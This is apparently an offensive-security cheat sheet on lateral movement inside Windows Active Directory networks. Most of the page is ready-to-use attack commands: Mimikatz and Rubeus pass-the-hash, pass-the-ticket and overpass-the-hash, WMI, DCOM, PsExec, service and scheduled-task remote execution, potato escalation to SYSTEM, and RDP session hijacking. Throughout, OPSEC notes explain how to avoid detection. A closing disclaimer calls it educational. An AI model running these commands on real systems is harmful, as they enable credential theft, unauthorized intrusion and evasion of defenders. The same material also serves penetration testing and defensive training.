---
title: "Lateral Movement — From Windows"
weight: 5
tags:
  - ad
  - lateral-movement
  - windows
  - pass-the-hash
  - pass-the-ticket
  - mimikatz
---

## Quick Reference

| Technique | Tool | Requirement |
|---|---|---|
| Pass-the-Hash (PtH) | Mimikatz, Invoke-TheHash, PsExec | Local Admin / NTLM hash |
| Pass-the-Ticket (PtT) | Rubeus, Mimikatz | Valid Kerberos ticket (.kirbi / base64) |
| Overpass-the-Hash | Mimikatz, Rubeus | NTLM or AES256 hash |
| WMI Exec | PowerShell WMI, wmic, SharpWMI | Local Admin on target |
| DCOM Exec | PowerShell COM objects | Local Admin / DCOM permissions |
| PowerShell Remoting | Enter-PSSession, Invoke-Command | WinRM enabled, appropriate rights |
| PsExec | Sysinternals PsExec | Local Admin, ADMIN$ writable |
| Remote Service | sc.exe | Local Admin on target |
| Scheduled Task | schtasks.exe | Local Admin / valid credentials |
| Token Impersonation | Incognito, Invoke-TokenManipulation | SeImpersonatePrivilege |
| RDP | mstsc, tscon | RDP enabled, valid credentials or SYSTEM |

---

## Pass-the-Hash (PtH)

Pass-the-Hash abuses the NTLM authentication protocol by presenting a captured password hash directly instead of the cleartext password. The target authenticates the hash without needing the plaintext credential.

### Mimikatz sekurlsa::pth

Spawns a new process in the context of the target user by injecting the NTLM hash into a new logon session:

```
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
```

For AES256-based authentication (preferred for OPSEC — avoids RC4 downgrade detection):

```
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /aes256:AES256_HASH /run:cmd.exe
```

The spawned process will have a new logon session with Kerberos and NTLM credentials loaded. Network authentication from that process will use the injected material.

### Invoke-TheHash (PowerShell — SMB and WMI)

Pure PowerShell implementation of PtH without touching LSASS. Useful when you cannot load Mimikatz on disk.

SMB execution:

```powershell
Invoke-SMBExec -Target TARGET_IP -Domain TARGET_DOMAIN -Username USERNAME -Hash NTLM_HASH -Command "whoami" -Verbose
```

WMI execution:

```powershell
Invoke-WMIExec -Target TARGET_IP -Domain TARGET_DOMAIN -Username USERNAME -Hash NTLM_HASH -Command "whoami" -Verbose
```

Both functions support the `-Command` parameter for arbitrary command execution. Output is returned inline. The WMI variant avoids SMB service creation artifacts.

### PsExec with Explicit Hash

Older technique, widely detected. Included for completeness:

```cmd
psexec /accepteula \\TARGET_IP -u USERNAME -p NTLM_HASH cmd
```

**OPSEC note:** PsExec creates the `PSEXESVC` service, writes a binary to `ADMIN$`, and generates Windows Event ID 7045 (service installed). Avoid in sensitive environments.

---

## Pass-the-Ticket (PtT)

Pass-the-Ticket injects an existing Kerberos TGT or TGS into the current logon session (or a sacrificial one), allowing authentication to services without knowing the user's password. Requires a valid `.kirbi` file or base64-encoded ticket.

### Rubeus ptt

Inject a ticket from a base64 blob or file path:

```
Rubeus.exe ptt /ticket:BASE64_OR_KIRBI
```

### Mimikatz kerberos::ptt

```
kerberos::ptt ticket.kirbi
```

### Verify Injected Tickets

After injection, always verify:

```cmd
klist
```

The output lists all cached tickets in the current logon session with their service targets and expiry times.

### Sacrificial Logon Session (Preferred OPSEC Approach)

Injecting tickets into your existing session can contaminate it and cause authentication failures. The recommended approach is to create a new isolated logon session first:

```
Rubeus.exe createnetonly /program:cmd.exe /show
```

This spawns a new process with a blank network credential logon session (LUID shown in output). Inject the ticket into that LUID:

```
Rubeus.exe ptt /ticket:BASE64_TICKET /luid:0xNEWLUID
```

Then perform all target actions from within that spawned process. Purge when done:

```
Rubeus.exe purge /luid:0xNEWLUID
```

---

## Overpass-the-Hash

Overpass-the-Hash converts an NTLM hash into a Kerberos TGT. This is useful when Kerberos authentication is required (e.g., targets enforcing it) but you only have an NTLM hash.

### Mimikatz

```
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /aes256:AES256_HASH /run:powershell.exe
```

Inside the spawned process, initiate Kerberos authentication to any resource (e.g., `dir \\TARGET_DOMAIN\SYSVOL`). Windows will automatically use the injected credentials to request a TGT from the KDC.

### Rubeus asktgt

Requests a TGT directly from the KDC using the hash, without spawning a process:

```
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /domain:TARGET_DOMAIN /ptt
```

Using AES256 (preferred — matches default encryption, avoids RC4 downgrade alert):

```
Rubeus.exe asktgt /user:USERNAME /aes256:AES256_HASH /domain:TARGET_DOMAIN /ptt
```

The `/ptt` flag injects the received TGT directly into the current session. Alternatively, export with `/nowrap` and inject manually into a sacrificial session.

---

## WMI Lateral Movement

Windows Management Instrumentation (WMI) allows remote process creation and management. It does not create a service or write a binary to disk on the target, making it quieter than PsExec.

### PowerShell WMI Execution

Using a PSCredential object for remote WMI:

```powershell
$SecPass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("TARGET_DOMAIN\USERNAME", $SecPass)

Invoke-WmiMethod -ComputerName TARGET_IP -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\output.txt" -Credential $cred
```

Read back the output:

```powershell
Invoke-WmiMethod -ComputerName TARGET_IP -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c type C:\output.txt > C:\result.txt" -Credential $cred

# Retrieve via SMB
Get-Content "\\TARGET_IP\C$\result.txt"
```

### wmic Command Line

```cmd
wmic /node:TARGET_IP /user:TARGET_DOMAIN\USERNAME /password:PASSWORD process call create "cmd.exe /c whoami"
```

Returns a ProcessId on success. Execution is asynchronous — output must be written to disk and retrieved via another channel (SMB, scheduled task, etc.).

### SharpWMI

.NET assembly for WMI remote execution with optional output retrieval:

```
SharpWMI.exe action=exec computername=TARGET_IP command="cmd.exe /c whoami" username=USERNAME password=PASSWORD
```

**OPSEC note:** WMI remote execution generates Event ID 4648 (explicit credential logon) on the attacker side and creates a `WmiPrvSE.exe` child process on the target. The command line of the spawned process is visible in process creation logs (Event ID 4688) if command line auditing is enabled.

---

## DCOM Lateral Movement

Distributed COM (DCOM) objects expose interfaces for remote code execution. Several built-in Windows DCOM objects can be abused without dropping additional tools. Requires local administrator rights on the target.

### MMC20.Application

Abuses the Microsoft Management Console COM object exposed over DCOM:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET_IP"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
```

**Notes on DCOM execution:**
- Requires TCP 135 (RPC endpoint mapper) and dynamic high ports to be accessible.
- Spawned processes run under the authenticated user's context on the remote system.
- Process creation is logged on the target (Event ID 4688 with command line auditing).
- ShellWindows and ShellBrowserWindow require Explorer to be running on the target (interactive user session).

---

## PowerShell Remoting

PowerShell Remoting uses WinRM (HTTP port 5985 / HTTPS port 5986) for remote management. Requires WinRM to be enabled on the target and the attacker to have appropriate rights (local administrators group or explicit WinRM access).

### Interactive Session

```powershell
Enter-PSSession -ComputerName TARGET_HOSTNAME -Credential (Get-Credential)
```

### Non-Interactive Command Execution

```powershell
$SecPass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("TARGET_DOMAIN\USERNAME", $SecPass)

Invoke-Command -ComputerName TARGET_HOSTNAME -ScriptBlock { whoami; hostname } -Credential $cred
```

### Persistent Session (Reusable)

```powershell
$sess = New-PSSession -ComputerName TARGET_HOSTNAME -Credential $cred
Invoke-Command -Session $sess -ScriptBlock { whoami }
Invoke-Command -Session $sess -ScriptBlock { net localgroup administrators }

# Copy files via session
Copy-Item -Path C:\Tools\tool.exe -Destination C:\Windows\Temp\tool.exe -ToSession $sess

# Remove session when done
Remove-PSSession $sess
```

### Enabling WinRM Remotely

If WinRM is not enabled but you have RPC/WMI access, enable it remotely:

```powershell
Invoke-WmiMethod -ComputerName TARGET_IP -Class Win32_Process -Name Create `
  -ArgumentList "powershell.exe -Command Enable-PSRemoting -Force" -Credential $cred
```

### Double-Hop Problem

When using PSRemoting, credentials are not delegated to a second hop (from the remote system to another system). Solutions:

1. **Rubeus createnetonly + ptt on the intermediate system:** Inject a TGT into the PSRemoting session process before making the second hop.
2. **CredSSP:** Allows credential delegation but is not recommended due to credential exposure risk and OPSEC concerns.
3. **Kerberos Constrained Delegation:** If properly configured on the intermediate host.

**OPSEC note:** PowerShell Remoting generates Event ID 4648 and creates a `wsmprovhost.exe` process on the target. Script block logging (Event ID 4104) captures all executed PowerShell if enabled.

---

## PsExec

PsExec is a Sysinternals utility for remote process execution. Authenticates via SMB (port 445), uploads a service binary to `ADMIN$`, installs it as a service, and communicates via a named pipe.

### Explicit Credentials

```cmd
PsExec.exe \\TARGET_IP -u TARGET_DOMAIN\USERNAME -p PASSWORD cmd.exe
```

### Current Kerberos Session (No Password Required)

When a valid TGT or service ticket is already in the session:

```cmd
PsExec.exe \\TARGET_HOSTNAME cmd.exe
```

The FQDN must be used (not IP) for Kerberos authentication to function correctly.

### With Hash (via Mimikatz pth first)

1. Open sacrificial session with Mimikatz sekurlsa::pth
2. From that session: `PsExec.exe \\TARGET_HOSTNAME cmd.exe`

### OPSEC Considerations

PsExec is heavily monitored and leaves multiple artifacts:
- Creates the `PSEXESVC` service on the target (Event ID 7045 — Service installed).
- Writes the service binary to `\\TARGET_IP\ADMIN$\PSEXESVC.exe`.
- Generates Event ID 4648 (explicit credentials logon) and Event ID 4624 (logon type 3).
- Named pipe activity is logged on modern EDR solutions.

Prefer Invoke-TheHash, WMI, or DCOM for quieter execution.

---

## Remote Service Creation

Creating a remote service via `sc.exe` is a manual equivalent to PsExec's service approach. Useful when PsExec is blocked but SMB admin shares are accessible.

```cmd
sc \\TARGET_IP create SERVICE_NAME binPath= "cmd.exe /c whoami > C:\output.txt" start= demand
sc \\TARGET_IP start SERVICE_NAME
```

Retrieve output via SMB:

```cmd
type \\TARGET_IP\C$\output.txt
```

Clean up:

```cmd
sc \\TARGET_IP delete SERVICE_NAME
```

**Note:** The service binary path is executed as SYSTEM. Arguments after `binPath=` must be carefully quoted. Service creation generates Event ID 7045.

---

## Scheduled Task Lateral Movement

Scheduled tasks can be created and triggered remotely over SMB/RPC. Useful alternative to service creation.

### Create, Run, and Delete

```cmd
schtasks /create /s TARGET_IP /u USERNAME /p PASSWORD /tn TASK_NAME /tr "cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00 /f

schtasks /run /s TARGET_IP /tn TASK_NAME

schtasks /delete /s TARGET_IP /tn TASK_NAME /f
```

### With Current Session (Kerberos)

```cmd
schtasks /create /s TARGET_HOSTNAME /tn TASK_NAME /tr "powershell.exe -enc BASE64PAYLOAD" /sc once /st 00:00 /f /ru SYSTEM
schtasks /run /s TARGET_HOSTNAME /tn TASK_NAME
schtasks /delete /s TARGET_HOSTNAME /tn TASK_NAME /f
```

### Impacket atexec (Reference)

From a Linux host through the network:

```
atexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "whoami"
```

**OPSEC note:** Scheduled task creation/modification generates Event ID 4698/4702. Task execution under SYSTEM context is visible in task scheduler logs.

---

## Token Impersonation

Token impersonation allows an attacker with SeImpersonatePrivilege (held by most service accounts, IIS AppPool identities, SQL Server service accounts) to steal tokens from other processes and execute code in their security context.

### Incognito (via Meterpreter)

List available tokens:

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "TARGET_DOMAIN\\DA_USERNAME"
```

After impersonation, all subsequent commands run in the context of the impersonated user.

### Invoke-TokenManipulation (PowerShell)

```powershell
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -ImpersonateUser -Username DA_USERNAME
```

### Token Abuse Conditions

- **SeImpersonatePrivilege** — required for network token impersonation (Rotten/Juicy/PrintSpoofer potato attacks).
- **SeAssignPrimaryTokenPrivilege** — allows assigning tokens to processes.
- Tokens from SYSTEM processes can be duplicated if running as Local Admin.

### Potato Attacks (Token Escalation to SYSTEM)

If you have SeImpersonatePrivilege as a service account, escalate to SYSTEM:

```powershell
# PrintSpoofer
.\PrintSpoofer.exe -i -c powershell.exe

# GodPotato
.\GodPotato.exe -cmd "cmd.exe /c whoami"
```

---

## RDP Lateral Movement

Remote Desktop Protocol (RDP) provides a graphical session to the target. Useful for interactive access but noisy and heavily logged.

### Standard RDP Connection

```cmd
mstsc /v:TARGET_IP /admin
```

The `/admin` flag requests an administrative session (console session), bypassing the two-session limit on non-server editions.

### RDP Session Hijacking (Requires SYSTEM)

Allows taking over an existing RDP session without knowing the user's credentials. Useful when another admin is already logged in.

List active sessions:

```cmd
query user /server:TARGET_IP
```

Hijack a specific session:

```cmd
tscon SESSION_ID /dest:rdp-tcp#ATTACKER_SESSION
```

This does not require the target user's password but requires SYSTEM-level access on the target.

### Enable RDP Remotely

Via PowerShell (requires remote management or WMI access):

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Via registry remotely (with admin access to remote registry):

```cmd
reg add \\TARGET_IP\HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Via WMI:

```powershell
Invoke-WmiMethod -ComputerName TARGET_IP -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c reg add `"HKLM\System\CurrentControlSet\Control\Terminal Server`" /v fDenyTSConnections /t REG_DWORD /d 0 /f" `
  -Credential $cred
```

### Restricted Admin Mode (RDP PtH)

Windows allows RDP with hash instead of password when Restricted Admin Mode is enabled on the target:

```cmd
# Enable Restricted Admin on target (requires admin access)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect with hash using xfreerdp (from attacker)
xfreerdp /v:TARGET_IP /u:USERNAME /pth:NTLM_HASH /cert:ignore
```

**OPSEC note:** RDP generates Event ID 4624 (logon type 10), Event ID 4778 (session reconnected), and Event ID 4779 (session disconnected). Session hijacking via tscon generates additional events. RDP activity is visible to SOC teams monitoring terminal services logs.

---

## Lateral Movement Decision Matrix

The following factors determine tool selection:

**Use WMI or DCOM when:**
- PsExec artifacts are a concern.
- Service creation alerts are monitored.
- An interactive session is not required.

**Use PowerShell Remoting when:**
- WinRM is enabled on the target.
- You need to run PowerShell scripts remotely.
- File transfers via sessions are needed.

**Use PtH or PtT when:**
- You have credential material (hash or ticket) but not cleartext passwords.
- Kerberos authentication is enforced (PtT is required).

**Use Token Impersonation when:**
- Running as a service account with SeImpersonatePrivilege.
- Local escalation to a higher-privileged user's context is needed.

**Use RDP when:**
- Interactive GUI access is required.
- Other methods are blocked but port 3389 is accessible.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
